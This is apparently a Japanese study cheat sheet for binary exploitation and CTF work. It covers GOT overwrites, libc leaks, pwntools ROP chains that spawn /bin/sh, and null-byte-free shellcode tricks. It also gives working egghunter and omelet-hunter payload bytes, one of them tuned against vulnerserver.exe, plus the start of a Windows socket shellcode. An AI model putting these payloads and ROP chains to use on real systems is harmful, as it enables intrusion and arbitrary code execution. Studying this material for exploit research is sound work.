│      ││   0x004009ee      c745fc010000.  mov dword [var_4h], 1 <- rbp-0x4にある変数に1を代入
```


### 覚えておきたい
#### 方針
すぐに落ちるようなプログラムは`exit`などの最後の方にある関数のGOTを`main`や`_start`に書き換えてループさせる必要がある。   

そのあとに、putsやprintfを呼び出してlibc leakさせる(systemを呼び出したいがアドレスがわからない)。   
その際、   
- setbufなどの別の関数のGOTをprintf@pltに書き換えてsetbufをcallしてprintfを呼び出す   
printf(leakしたいアドレス)としたいので、書き換えるGOTは引数を伴うものがよい。  
printf@pltのアドレスは固定。   
- printf@plt(ランダム化されない)をリターンアドレスにセット(x86)   
すでに一度呼ばれた関数のGOTにはlibcのアドレスが書かれているので、引数にはGOT_addrをセットしてlibc leak   
- `pop rdi;ret`をリターンアドレスにセットしてROP gadget (x86-64)   
- すでに一度呼ばれた関数のGOTの下位バイトを書き換えて別のlibcの関数を呼びだす   

#### 起動時の動作
```txt
_start -> __libc_start_main -> main という流れ
mainでなくても_startでもループできる

gdb-peda$ bt
#0  0x00000000004007fe in main ()
#1  0x00007ffff7a05b97 in __libc_start_main (main=0x4007fa <main>, argc=0x1, 
    argv=0x7fffffffdf88, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, 
    stack_end=0x7fffffffdf78) at ../csu/libc-start.c:310
#2  0x000000000040070a in _start ()
```
#### 呼び出し規約
- x86の場合   
関数の引数はスタックに積まれる   
- x64の場合   
`rdi rsi	rdx	rcx	r8 r9`の順に引数としてレジスタが使われ、7個目以降はスタックが使われる。   
戻り値は`rax`が使用される。   

#### アドレス関係
```txt
libc_base        = addr_libc_mainarena - offset_libc_mainarena
libc_base        = libc_start_main - offset_libc_start_main
addr_libc_system    = libc_base + offset_libc_system
addr_libc_str_sh (/bin/sh)   = libc_base + offset_libc_str_sh
addr_libc_free_hook    = libc_base + offset_libc_free_hook
libc_gadget = libc_base + 0x4f2c5

(low)
|               |
|               |
|         0x251 | <- heap_base (不変)  0x555555757000
|               |
|0x555555757460 | <- tcache[0x120]の実体は0x250のchunkのどこかに存在
|               |
|               |
|         0x120 | <- 最後のチャンク 0x555555757460
|  AAAAA  AAAAA |
|   ~       ~   |
|  AAAAA  AAAAA |
|  AAAAA  20a00 | <- heap_top 0x555555757580
|               |    可変で下にどんどん伸びていく
|               |
|               |
|               |
|               | <- libc_base   0x7ffff79e4000 
|               |
|               | <- libc_start_main 0x7ffff7a05ab0
|               |
|               | <- libc_system 0x7ffff7a33440
|               |
|               | <- "/bin/sh"のポインタ 0x7ffff7b97e9a
|               |
|               | <- main_arena  0x7ffff7dcfc40
|               |
|               | <- fastbinsの実体 (0x80bytes以下)
|               |
|               | <- bins(unsortedbins)の実体 [main_arena+0x60]
|               |
|               |
|               |
|               | <- stack 0x7fffffffdea0
|               |
(high)
```
`0x7fffff...`はスタックのアドレス。`0x555555...`はスタックのアドレス、であることが多い(?)。
#### リトルエンディアン
`ABCDEF`という入力をした場合、   
```txt
gdb-peda$ x /4wx $rbp-0x90
0x7fffffffdd90:	0x44434241	0x00004645	0xf7ffe710	0x00007fff

gdb-peda$ x /2gx $rbp-0x90
0x7fffffffdd90:	0x0000716034647461	0x00007ffff7ffe710

         3  2  1  0
-> +0 | 44 43 42 41 |   (高)  7  6  5  4     3  2  1  0   (低)
-> +4 | 00 00 46 45 |   -> | 00 00 46 45 || 44 43 42 41 |

0| 41 |  入力      ABCDEF
1| 42 |  　    (低)上   下(高)
2| 43 |
3| 44 | 
4| 45 |
5| 46 |
6| 00 |
7| 00 |
8| ?? |

gdb-peda$ x /s $rbp-0x90
0x7fffffffdd90:	"ABCDEF"

RDI: 0x7fffffffdd90 --> 0x464544434241 ('ABCDEF')
```
メモリ上に格納される時、順序がこうなる。なお、文字列として読みだすときは順序が入力したときと同じに評価される。 

一方、アドレスは以下のように評価される。したがって、BOFでRIPを書き換えたりするときは、`10e7...ff7f`というように逆順に入力する必要がある。
```txt
gdb-peda$ x /gx $rbp-0x88
0x7fffffffdd98:	0x00007ffff7ffe710
```
```txt
[Immunit Debugger]風のスタック図
ESPがずれて表示される！

push 0x41424344後           　　push 0x0102後           push 0x0304               入力 "ABCD"
右下に表示されるスタック図
+08| 00 00 00 00 |　　　　　+06| 00 00 00 00 |         +04| 00 00 00 00 |         +00| 00 00 00 00 |
+0c| 00 00 00 00 |         +0a| 00 00 00 00 |         +08| 00 00 00 00 |         +04| 00 00 00 00 |
+10| 41 42 43 44 | <- esp  +0e| 43 44 01 02 | <- esp  +0c| 01 02 03 04 | <- esp  +08| 44 43 42 41 | <- esp
+14| 00 00 00 00 |         +12| 00 00 41 42 |         +10| 41 42 43 44 |         +0c| 01 02 03 04 |

08|    |                   08|    |                   08|    |                   08| 41 | <- esp+0
09|    |                   09|    |                   09|    |                   09| 42 |    esp+1
0a|    |                   0a|    |                   0a|    |                   0a| 43 |    esp+2
0b|    |                   0b|    |                   0b|    |                   0b| 44 |    esp+3
0c|    |                   0c|    |                   0c| 04 | <- esp+0          0c| 04 |
0d|    |                   0d|    |                   0d| 03 |    esp+1          0d| 03 |
0e|    |                   0e| 02 | <- esp+0          0e| 02 |    esp+2          0e| 02 | 
0f|    |                   0f| 01 |    esp+1          0f| 01 |    esp+3          0f| 01 | 
10| 44 |  <- esp+0         10| 44 |    esp+2          10| 44 |                   10| 44 | 
11| 43 |  　 esp+1         11| 43 |    esp+3          11| 43 |                   11| 43 | 
12| 42 |     esp+2         12| 42 |                   12| 42 |                   12| 42 |
13| 41 |     esp+3         13| 41 |                   13| 41 |                   13| 41 | 
14| 00 |                   14| 00 |                   14| 00 |                   14| 00 | 
15| 00 |                   15| 00 |                   15| 00 |                   15| 00 |
16| 00 |                   16| 00 |                   16| 00 |                   16| 00 |
17| 00 |                   17| 00 |                   17| 00 |                   17| 00 |
18| ?? |                   18| ?? |                   18| ?? |                   18| ?? |


ちなみに、右下のスタック図と左下のメモリDumpは読み方が違う！

右下のやつ
+00| 64 63 62 61 | abcd <- 右側が低いアドレス。ASCII表示するときは反転
+04| 00 00 66 65 | ed..
+08| 44 43 42 41 | ABCD
+0c| 48 47 46 45 | EFGH

左下のやつ
+00| 61 62 63 64 65 66 00 00 | abcdef.. <- 左側が低いアドレス。ASCII表示するときはそのまま(反転しない)
+08| 41 42 43 44 45 46 47 48 | ABCDEFGH

```
#### pwntools
##### 文字列操作
- `0x7fff1234 -> b '\x34\x12\xff\x7f'`   
```python
#python3のみ
# 文字列と結合しようとすると、
# TypeError: must be str, not bytes
val.to_bytes(int(byte),'little')
```   
```python
# python2 のみ
from pwn import *
r = remote("localhost", 4444)
p32(0x7fff1234) # '4\x12\xff\x7f'
p64(0x7fff1234) # '4\x12\xff\x7f\x00\x00\x00\x00'
payload  = "A" * 0x28 + p64(0x7fff1234)
r.send(payload)
```
- `\x34\x12\xff\x7f -> 0x7fff1234`   
```python
# python2 のみ
from pwn import *
hex(unpack('\xef\xbe\xad\xde')) # 0xdeadbeef
hex(u32('\xef\xbe\xad\xde'))  # 0xdeadbeef
hex(u64('\xef\xbe\xad\xde\x41\x42\x43\x45'))  # 0x45434241deadbeef
  
# python2,3 両方
import struct
print(hex(struct.unpack('<I',b'\x34\x12\xff\x7f')[0]))
```
- 0x7fffffff12345678(str) -> 0x7fffffff12345678(hex)
```python
lib_main_start_str = "0x7fffffff12345678"
hex(int(str(lib_main_start_str), 16))      # 0x7fffffff12345678
```
- `\`ruUUU -> 0x555555757260`   
```python
heap_addr = conn.recv(6)
hex(u64(heap_addr.ljust(8,b'\0'))) #0x555555757260
```
##### 通信関係
```txt
from pwn import *
conn = remote("localhost", 5000)

conn.sendafter("index: ", "-2")
conn.sendlineafter("ID: ", "admin")
libc_start_main = conn.recvline() #改行まで読み込み
conn.recvuntil('\n')

printf = conn.recv(6)      # 6を指定しないと余計なものまで読み込んでしまう
print("recv:" + printf)                  # recv:\x80\x8e\xa4�� (\x80\x8e\xa4\xf7\xff\x7f)
libc_printf = u64(printf.ljust(8,b'\0')) # libc_printf:0x7ffff7a48e80
                                         # u64(\x80\x8e\xa4\xf7\xff\x7f\x00\x00)

conn.interactive()
```
##### ELF解析
```txt
from pwn import *
context(os = "linux", arch = "amd64")
elf = ELF("./chall")
libc = ELF("./libc-2.27.so")

str(elf.got["malloc"]) #6295608
p64(elf.plt["printf"]) #\x90\x05@\x00\x00\x00\x00\x00
hex(elf.plt["printf"]) #0x400590
libc.symbols["__libc_start_main"] #137904
offset_libc_printf = libc.symbols["printf"] #137904
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10
offset_libc_free_hook = libc.symbols['__free_hook']
offset_libc_system = libc.symbols['system']
addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

info('addr_libc_base    = 0x{:08x}'.format(libc_base))
```
##### Rop Chain
```txt
# puts(GOT_printf)でlibc leak

elf = ELF("./file")
rop = ROP(elf)
rop.puts(elf.got.printf)
rop.main()
print(rop.dump())
# 0x0000:         0x400873 pop rdi; ret             # return_addr
# 0x0008:         0x601020 [arg0] rdi = got.printf  # すでに一度呼ばれたprintf関数のGOT_addr
# 0x0010:         0x4005d0 puts                     # puts@plt
# 0x0018:         0x400782 main()                   # main関数の最初
conn.sendlineafter("ID: ", "A"*40 + rop.chain() )

# system("/bin/sh")呼び出し

libc.address = libc_printf - libc.symbols.printf

rop = ROP(libc)
# rop.system(next(libc.search(b'/bin/sh'))) # スタックアラインメントの問題がある場合がある
# rop.raw(0x400874)                         # retでrspを8バイトずらす
rop.execv(next(libc.search(b'/bin/sh')),0 ) # systemがダメな時はexecv()を使う
print(rop.dump())
# 0x0000:   0x7ffff7a07e6a pop rsi; ret
# 0x0008:              0x0 [arg1] rsi = 0
# 0x0010:   0x7ffff7a0555f pop rdi; ret
# 0x0018:   0x7ffff7b97e9a [arg0] rdi = 140737349516954
# 0x0020:   0x7ffff7ac8fa0 execv
conn.sendlineafter("ID: ", "A"*40 + rop.chain() )
```
#### metasploit
`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 4000`   
`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 336e4532`   
#### nasm
`/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb `   
```txt
nasm > jmp $+17
00000000  EB0F              jmp short 0x11 <- 相対アドレス。jmp命令のあるアドレス+0x11にjmpするということ
nasm > call $-0d
00000000  E8FBFFFFFF        call 0x0 <- リターンアドレスをセットしてjmpと同様に相対アドレスにjmp
nasm > jmp esp
00000000  FFE4              jmp esp

0xCC INT3       <- この命令を実行後ブレークする。Exploit書く時のデバッグに使える 
```
- `nasm -felf32 sample.asm`   
- `ld -m elf_i386 sample.o -o sample.out`   
- `for i in $(objdump -d sample.out |grep "^ " |cut -f2); do echo -n '\x'$i; done; echo`   
- `python -c "print('\x74\x2b\x43')" > a.out; objdump -D -M intel a.out -b binary -m i386`   
```txt
global _start

section .text

_start:

;WINSOCK_API_LINKAGE SOCKET WSAAPI WSASocketA(
;  int                 af - 2, AF_INET (IPv4)
;  int                 type - 1, SOCK_STREAM (TCP)
;  int                 protocol - 6, IPPROTO_TCP (TCP)
;  LPWSAPROTOCOL_INFOA lpProtocolInfo - NULL,
;  GROUP               g - 0, No group operation
;  DWORD               dwFlags - 0 No flags
;);

; Create the socket with WSASocketA()

xor eax,eax
push eax        ; dwFlags 0
push eax        ; group
push eax        ; ProtocolInfo
xor ebx,ebx    
mov bl,6
push ebx        ; Protocol IPPROTO_TCP 6
```
##### bypass NULLbyte
```txt
nasm > mov eax,0x0
00000000  B800000000        mov eax,0x0   ; ダメ
-----------------------------------------------------
nasm > xor eax,eax
00000000  31C0              xor eax,eax   ; OK
```
```txt
nasm > MOV [EBP+0x80],Al
00000000  888580000000      mov [ebp+0x80],al  ; ダメ
------------------------------------------------------
nasm > add ebp,0x1
00000000  83C501            add ebp,byte +0x1
nasm > MOV [EBP+0x7f],Al
00000000  88457F            mov [ebp+0x7f],al  ; OK

nasm > MOV [EBP-0x80],Al
00000000  884580            mov [ebp-0x80],al  ; 負のオフセットならなおよし
nasm > MOV [EBP-0x81],Al
00000000  88857FFFFFFF      mov [ebp-0x81],al
```
```txt
nasm > mov eax,0x006e616c
00000000  B86C616E00        mov eax,0x6e616c   ; ダメ
------------------------------------------------------
nasm > mov ebx,0xffffffff
00000000  BBFFFFFFFF        mov ebx,0xffffffff
nasm > mov eax,0xff919e93
00000000  B8939E91FF        mov eax,0xff919e93 ; xorをあらかじめ計算しておいて逆算する
nasm > xor eax,ebx
00000000  31D8              xor eax,ebx
```
```txt
nasm > mov esi,eax
00000000  89C6              mov esi,eax    ; ダメじゃないけど2バイト必要
---------------------------------------------------
nasm > xchg eax,esi
00000000  96                xchg eax,esi   ; 2バイトが1バイトになった！
```
```txt
nasm > push dword 0x5c11
00000000  68115C0000        push dword 0x5c11 ; ダメ
-------------------------------------------------------
nasm > push word 0x5c11
00000000  6668115C          push word 0x5c11  ; OK
```
```txt
nasm > mov edx,0x646d63                        ; "cmd" 63 6D 64 -> 0x646d63
00000000  BA636D6400        mov edx,0x646d63   ; ダメ
---------------------------------------------------------
nasm > mov edx,0x646d6363
00000000  BA63636D64        mov edx,0x646d6363 ; "ccmd" 0x646d6363
nasm > shr edx,8
00000000  C1EA08            shr edx,byte 0x8   ; "cmd" 0x00646d63 右8ビットシフト(左は0埋め)
```
```txt
nasm > mov eax,0x100
00000000  B800010000        mov eax,0x100  ; ダメ
---------------------------------------------------------
nasm > xor eax,eax
00000000  31C0              xor eax,eax
nasm > inc eax
00000000  40                inc eax           ; 0x00000001
nasm > rol eax,8
00000000  C1C008            rol eax,byte 0x8  ; 0x00000100  2文字分左にローテーションさせる
```
```txt
0x0178f0ff -> 0x0178f000 に変換したい

nasm > shr edi,8
00000000  C1EF08            shr edi,byte 0x8 ; 0x000178f0 右ビットシフト(左はゼロ埋め)
nasm > shl edi,8
00000000  C1E708            shl edi,byte 0x8 ; 0x0178f000 左ビットシフト(右はゼロ埋め)
-------------------------------------------------------------
nasm > and edi,0xffffff01
00000000  81E701FFFFFF      and edi,0xffffff01  ; 下位２バイトを00にするためにANDをとる
nasm > and edi,0xffffff10
00000000  81E710FFFFFF      and edi,0xffffff10  ; これでも行けるけど、サイズがかなりでかい。美しくない
```
##### Egg-Hunter
Egg hunter using SEH injection   
```txt
# Egg hunter size = 60 bytes, Egg size = 8 bytes
EB21       jmp short 0x23
59         pop ecx
B890509050 mov eax,0x50905090  ; this is the tag
51         push ecx
6AFF       push byte -0x1
33DB       xor ebx,ebx
648923     mov [fs:ebx],esp
6A02       push byte +0x2
59         pop ecx
8BFB       mov edi,ebx
F3AF       repe scasd
7507       jnz 0x20
FFE7       jmp edi
6681CBFF0F or bx,0xfff
43         inc ebx
EBED       jmp short 0x10
E8DAFFFFFF call 0x2
6A0C       push byte +0xc
59         pop ecx
8B040C     mov eax,[esp+ecx]
B1B8       mov cl,0xb8
83040806   add dword [eax+ecx],byte +0x6
58         pop eax
83C410     add esp,byte+0x10
50         push eax
33C0       xor eax,eax
C3         ret

egghunter = "\xeb\x21\x59\xb8"
egghunter += "w00t"
egghunter += "\x51\x6a\xff\x33\xdb\x64\x89\x23\x6a\x02\x59\x8b\xfb"
egghunter += "\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb"
egghunter += "\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1"
egghunter += "\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x33\xc0\xc3"
```
Egg hunter using IsBadReadPtr   
```txt
# Egg hunter size = 37 bytes, Egg size = 8 bytes
33DB       xor ebx,ebx
6681CBFF0F or bx,0xfff
43         inc ebx
6A08       push byte +0x8
53         push ebx
B80D5BE777 mov eax,0x77e75b0d
FFD0       call eax
85C0       test eax,eax
75EC       jnz 0x2
B890509050 mov eax,0x50905090 ; this is the tag
8BFB       mov edi,ebx
AF         scasd
75E7       jnz 0x7
AF         scasd
75E4       jnz0x7
FFE7       jmp edi

egghunter = "\x33\xdb\x66\x81\xcb\xff\x0f\x43\x6a\x08"
egghunter += "\x53\xb8\x0d\x5b\xe7\x77\xff\xd0\x85\xc0\x75\xec\xb8"
egghunter += "w00t"
egghunter += "\x8b\xfb\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
```
Egg hunter using NtDisplayString   
```txt
# Egg hunter size = 32 bytes, Egg size = 8 bytes
6681CAFF0F  or dx,0x0fff
42          inc edx
52          push edx
6A43        push byte +0x43   ; NtDisplayStringのsyscall番号
58          pop eax
CD2E        int 0x2e
3C05        cmp al,0x5
5A          pop edx
74EF        jz 0x0
B890509050  mov eax,0x50905090  ; this is the tag
8BFA        mov edi,edx
AF          scasd
75EA        jnz 0x5
AF          scasd
75E7        jnz 0x5
FFE7        jmp edi

egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
egghunter += "w00t"
egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
```
Egg hunter using NtAccessCheck (AndAuditAlarm)   
```txt
# Egg hunter size = 32 bytes, Egg size = 8 bytes
6681CAFF0F  or dx,0x0fff   ; はじめはedx=0x00000000に0x0fffを代入。
                           ; 2回目のループでは0x00001000に0xfffを代入して、0x00001fffとなる。
42          inc edx        ; acts as a counter
                           ;(increments the value in EDX)
52          push edx       ; pushes edx value to the  stack
                           ;(saves our current address on the stack)
                           ; このedxの値が、syscallによって読み込み権限があるか確認するアドレス
                           ; 権限がない(Access-violationが発生)と、0x1000足して次のアドレスの権限を確認を繰り返す。
6A43        push byte +0x2 ; push 0x2 for NtAccessCheckAndAuditAlarm
                           ; or 0x43 for NtDisplayString to stack
                           ; syscallの番号。カーネルモードでアドレスの値を参照して権限を確認する。
                           ; 文字列へのポインタを引数にとり、読み込もうとするsyscallの関数を使う。
58          pop eax        ; pop 0x2 or 0x43 into eax
                           ; so it can be used as parameter
                           ; to syscall - see next
                           ; syscallの番号はeaxに代入しておく。
CD2E        int 0x2e       ; tell the kernel i want a do a
                           ; syscall using previous register
                           ; カーネルモードでKiSystemService関数を呼びだす。
                           ; この関数が、syscall番号に対応する関数(NtAccessCheckAndAuditAlarmなど)を呼び出す
3C05        cmp al,0x5     ; check if access violation occurs
                           ;(0xc0000005== ACCESS_VIOLATION) 5
                           ; Access-Violationが発生すると、読み込み権限がないので、そもそもeggがあるかすら確認できない
5A          pop edx        ; restore edx
74EF        je xxxx        ; jmp back to start dx 0x0fffff
B890509050  mov eax,0x50905090 ; this is the tag (egg)
8BFA        mov edi,edx    ; set edi to our pointer
AF          scasd          ; compare for status. 「ediから読み込んだ値」と「eaxの値」を比較
                           ; edi(0x1000とか)から読み込んだ値とeax(egg)の値を比較
                           ; 比較したあと、edi+0x4される。つまり、2つ目の4バイトのeggを指すようになる。
75EA        jnz xxxxxx     ; (back to inc edx) check egg found or not
                           ; eggが見つからなければjmpする
AF          scasd          ; when egg has been found
                           ; 比較後は、2つ目の4バイトのeggから、次の4バイト後のshellcodeを指すようになる
75E7        jnz xxxxx      ; (jump back to "inc edx")
                           ; if only the first egg was found
FFE7       jmp edi         ; edi points to begin of the shellcode

egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
egghunter += "\x77\x30\x30\x74" # this is the marker/tag: w00t
egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
```
Omlet-Hunter   
- `w32_SEH_omelet.py w32_SEH_omelet.bin calc.bin calceggs.txt 127 0xBADA55`   
`calc.bin`のシェルコードを分割して、calceggs.txtに用意する。127サイズ以下に分割して、マーカーは`0xbada55`に設定。   
omlet-hunterはタグを頼りに、全ての分割されたeggを見つけて、元のshellcodeをスタックの最後の方に復元して、実行する。   

```C
// This is the binary code that needs to be executed to find the eggs, 
// recombine the orignal shellcode and execute it. It is 82 bytes:
omelet_code = "\x31\xFF\xEB\x23\x51\x64\x89\x20\xFC\xB0\x55\xF2\xAE\x50\x89\xFE\xAD\x35\xFF\x55\xDA\xBA\x83\xF8\x03\x77\x0C\x59\xF7\xE9\x64\x03\x42\x08\x97\xF3\xA4\x89\xF7\x31\xC0\x64\x8B\x08\x89\xCC\x59\x81\xF9\xFF\xFF\xFF\xFF\x75\xF5\x5A\xE8\xC7\xFF\xFF\xFF\x61\x8D\x66\x18\x58\x66\x0D\xFF\x0F\x40\x78\x03\x97\xEB\xDB\x31\xC0\x64\xFF\x50\x08";

// These are the eggs that need to be injected into the target process 
// for the omelet shellcode to be able to recreate the original shellcode
// (you can insert them as many times as you want, as long as each one is
// inserted at least once). They are 90 bytes each:
egg0 = "\x55\xFF\x55\xDA\xBA\xB8\x7A\x1D\x40\xC4\xDB\xDF\xD9\x74\x24\xF4\x5B\x31\xC9\xB1\x31\x83\xC3\x04\x31\x43\x0F\x03\x43\x75\xFF\xB5\x38\x61\x7D\x35\xC1\x71\xE2\xBF\x24\x40\x22\xDB\x2D\xF2\x92\xAF\x60\xFE\x59\xFD\x90\x75\x2F\x2A\x96\x3E\x9A\x0C\x99\xBF\xB7\x6D\xB8\x43\xCA\xA1\x1A\x7A\x05\xB4\x5B\xBB\x78\x35\x09\x14\xF6\xE8\xBE\x11\x42\x31\x34\x69\x42\x31\xA9\x39";
egg1 = "\x55\xFE\x55\xDA\xBA\x65\x10\x7C\x32\x3C\xB2\x7E\x97\x34\xFB\x98\xF4\x71\xB5\x13\xCE\x0E\x44\xF2\x1F\xEE\xEB\x3B\x90\x1D\xF5\x7C\x16\xFE\x80\x74\x65\x83\x92\x42\x14\x5F\x16\x51\xBE\x14\x80\xBD\x3F\xF8\x57\x35\x33\xB5\x1C\x11\x57\x48\xF0\x29\x63\xC1\xF7\xFD\xE2\x91\xD3\xD9\xAF\x42\x7D\x7B\x15\x24\x82\x9B\xF6\x99\x26\xD7\x1A\xCD\x5A\xBA\x70\x10\xE8\xC0\x36\x12";
egg2 = "\x55\xFD\x55\xDA\xBA\xF2\xCA\x66\x7B\xC3\x41\xE9\xFC\xDC\x83\x4E\xF2\x96\x8E\xE6\x9B\x7E\x5B\xBB\xC1\x80\xB1\xFF\xFF\x02\x30\x7F\x04\x1A\x31\x7A\x40\x9C\xA9\xF6\xD9\x49\xCE\xA5\xDA\x5B\xAD\x28\x49\x07\x1C\xCF\xE9\xA2\x60\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40";
```
vulnserver.exeで動作したOmlet-Hunterは以下。   
```txt
   0:	83 e9 78             	sub    ecx,0x78 ; ECXがEggより高いアドレスだったため、
   3:	83 e9 78             	sub    ecx,0x78 ; ecx-562することで、Eggより低いアドレスに設定
   6:	83 e9 78             	sub    ecx,0x78 ; こうすると、Eggの近くから検索が開始されるので早く見つけられる！
   9:	83 e9 78             	sub    ecx,0x78
   c:	83 e9 52             	sub    ecx,0x52 
   f:	89 cf                	mov    edi,ecx  ; ediが0x0の場合だと、0x00000000を参照しようとしてAccess-Violationとなった
                                            ; そのため、ECXを活用して恣意的にEggの近くから探索を始めるようにする
  11:	bb fd ff ff ff       	mov    ebx,0xfffffffd ; eggをすべて見つけた後でもループが終わらず、権限のないアドレスを参照
                                                  ; してAccess-Violationとなったため、3回分のEggをカウントするようにする
                                                  ; 0xffffffff-egg_size+1 をほかで使用してないEBXに代入
  16:	eb 29                	jmp    0x41     ; [1]にジャンプ(SEHがうんたらかんたら？？)
  18:	51                   	push   ecx      ; [3] <- jmp先
  19:	64 89 20             	mov    DWORD PTR fs:[eax],esp
  1c:	fc                   	cld    
  1d:	b0 55                	mov    al,0x55  ; 0x55回、1バイトずつEggの指す分割Shellcodeからスタックに値をコピーする
  1f:	f2 ae                	repnz scas al,BYTE PTR es:[edi] ; ediが0x1増える？よくわかってない…
  21:	50                   	push   eax
  22:	89 fe                	mov    esi,edi ; この時のediのアドレスがちょうどEggを指していればEggを発見できる
  24:	ad                   	lods   eax,DWORD PTR ds:[esi] ; Eggかもしれない値をEaxに代入
  25:	35 ff 55 da ba       	xor    eax,0xbada55ff ; eaxの値が0xbada55ffならEgg発見！
  2a:	83 f8 03             	cmp    eax,0x3
  2d:	77 12                	ja     0x41   ; [1]にジャンプ(Eggは発見できない場合)
  2f:	59                   	pop    ecx ; Eggを発見した場合、以下の処理を実行
  30:	f7 e9                	imul   ecx
  32:	64 03 42 08          	add    eax,DWORD PTR fs:[edx+0x8]
  36:	97                   	xchg   edi,eax
  37:	f3 a4                	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi] ; 0x55回、1バイトずつスタックの最後にShellcodeの一部を書き込む
  39:	83 fb ff             	cmp    ebx,0xffffffff  ; ebx=0xfffffffdが2回incされると、合計3個分発見したことになり、Shellcodeにジャンプ
  3c:	74 2e                	je     0x6c     ; [5]にジャンプ(shellcode用の処理にジャンプ)
  3e:	43                   	inc    ebx ; 0xfffffffdに0x1を足す。3個分のEggをカウントする
  3f:	89 f7                	mov    edi,esi
  41:	31 c0                	xor    eax,eax    ; [1] <- jmp先
  43:	64 8b 08             	mov    ecx,DWORD PTR fs:[eax]
  46:	89 cc                	mov    esp,ecx    ; [2] <- jmp先
  48:	59                   	pop    ecx
  49:	81 f9 ff ff ff ff    	cmp    ecx,0xffffffff ; SEHの最後の例外ハンドラの0xffffffffかどうか確認してる？
  4f:	75 f5                	jne    0x46      ; [2]にジャンプ
  51:	5a                   	pop    edx
  52:	e8 c1 ff ff ff       	call   0x18   ; [3]にジャンプ(次のアドレスでEggを探す)
  57:	61                   	popa          ; ここら辺に到達することなくね？？と思ってる。全然わからん…
  　　　　　　　　　　　　　　　　　　　　　　; ここから、[5]まで省いても問題なくShellcode実行まで行けたわ…
                                          ; 多分、魔改造した結果必要なくなったっぽい？？
  58:	8d 66 18             	lea    esp,[esi+0x18]
  5b:	58                   	pop    eax
  5c:	66 0d ff 0f          	or     ax,0xfff
  60:	40                   	inc    eax
  61:	78 03                	js     0x66   ; [4]にジャンプ
  63:	97                   	xchg   edi,eax
  64:	eb db                	jmp    0x41   ; [1]にジャンプ
  66:	31 c0                	xor    eax,eax ; [4] <- jmp先
  68:	64 ff 50 08          	call   DWORD PTR fs:[eax+0x8] ; ここらへんはよくわからん
  6c:	c1 ef 08             	shr    edi,0x8  ; [5] <- jmp先 Ediがshellcodeを指すように調整
  6f:	c1 e7 08             	shl    edi,0x8
  72:	ff e7                	jmp    edi      ; ediの指すShellcodeにジャンプして実行！

\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9R\x89\xcf\xbb\xfd\xff\xff\xff\xeb)Qd\x89\xfc\xb0U\xf2\xaeP\x89\xfe\xad5\xffU\xda\xba\x83\xf8\x03w\x12Y\xf7\xe9d\x03B\x08\x97\xf3\xa4\x83\xfb\xfft.C\x89\xf71\xc0d\x8b\x08\x89\xccY\x81\xf9\xff\xff\xff\xffu\xf5Z\xe8\xc1\xff\xff\xffa\x8df\x18Xf\r\xff\x0f@x\x03\x97\xeb\xdb1\xc0d\xffP\x08\xc1\xef\x08\xc1\xe7\x08\xff\xe7

以下の省略版のOmlet-HunterでもShellcode実行まで行けた！！
相対JMPとかをうまく行くように調整したりした。
\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9R\x89\xcf\xbb\xfd\xff\xff\xff\xeb)Qd\x89\xfc\xb0U\xf2\xaeP\x89\xfe\xad5\xffU\xda\xba\x83\xf8\x03w\x12Y\xf7\xe9d\x03B\x08\x97\xf3\xa4\x83\xfb\xfft\x19C\x89\xf71\xc0d\x8b\x08\x89\xccY\x81\xf9\xff\xff\xff\xffu\xf5Z\xe8\xc1\xff\xff\xff\xc1\xef\x08\xc1\xe7\x08\xff\xe7
```
SEH Omlet shellcodeは以下からダウンロードできる。   
https://code.google.com/archive/p/w32-seh-omelet-shellcode/downloads   
#### Windows周り
- `arwin`   
```txt
arwin.exe kernel32 CreateProcessA
arwin.exe ws2_32 WSASocketA
arwin.exe ws2_32 connect
arwin.exe kernel32.dll WinExec
arwin.exe user32 MessageBoxA
```
- `mona`   
```txt
!mona modules
!mona find -s "¥xff¥xe4" -m slmfc.dll
```
#### alarmのbypass
`hexedit`でバイナリを書き換える。   
`[Ctrl]+x`で保存   
`[Ctrl]+c`で保存しない   
`/`で検索。`e8 9f fe ff ff`で検索する。`[Tab]`で切り替え   
```txt
  400867:	bf 3c 00 00 00       	mov    edi,0x3c           <- bf ff ff 00 00 に書き換えてもよい
  40086c:	e8 9f fe ff ff       	call   400710 <alarm@plt> <- 90 90 90 90 90 に書き換えてalarmを無視
```
#### Cの関数
```txt
---------------------------------------------------------------------
setbuf

#include <stdio.h>
void setbuf(FILE *, char *buffer);

buffer 引数が NULL の場合、stream はバッファーに入れられません。
そうでない場合、buffer は、長さが BUFSIZ の文字配列を指している必要があります

int init(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    return 0;
}
バッファを経由するかどうか？NULLの場合はバッファを経由しない？

---------------------------------------------------------------------
gets

        char    buff[100];
        gets(buff);
        
文字列が何文字読み込まれるか分からないので、BOFの脆弱性がある。
gets関数は改行かEOFまでの文字列をNUL文字も含めて読み込む

----------------------------------------------------------------------
strcpy

#include <string.h>
char *strcpy(char *s1, const char *s2);

文字型配列 *s1 に文字列 *s2 を '\0' までコピー。
'\0' もコピーする。BOFを起こしやすい危険な関数

```
## 参考文献
### Heap
http://kyuri.hatenablog.jp/entry/2017/04/21/152626   
